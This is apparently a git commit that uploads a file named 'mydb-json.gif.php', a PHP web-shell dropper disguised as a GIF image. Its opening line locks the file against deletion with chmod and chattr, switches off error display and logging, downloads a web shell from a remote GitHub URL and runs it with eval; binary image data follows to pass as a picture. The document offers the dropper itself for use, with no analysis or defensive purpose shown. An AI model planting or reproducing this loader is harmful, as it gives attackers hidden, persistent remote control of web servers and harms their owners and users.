cdbfbaac817e65af00409e0d59911a200241949a
hackerman <76028485+exploit-haxor@users.noreply.github.com>
2024-11-15 19:36:03 +0700

    Add files via upload

---
+++ mydb-json.gif.php
@@ -0,0 +1,11 @@
+<?$this_file=__FILE__;@system("chmod ugo-w $this_file");@system("chattr +i $this_file");error_reporting(0);ini_set('display_errors','0');ini_set('log_errors','0');$url="https://raw.githubusercontent.com/exploit-haxor/webshell/main/-21one.php";$ch=curl_init($url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$result=curl_exec($ch);eval("?>".$result);?>��C	
+		
+
+		
+
+
+��C	������"#Qr����&1!A"2qQa���?�y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H�@T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�x?"���Y騐�O�	q�`~~�t�U�Cڒ�V		I1��_��
+<?
+?>
+<?php
+?>
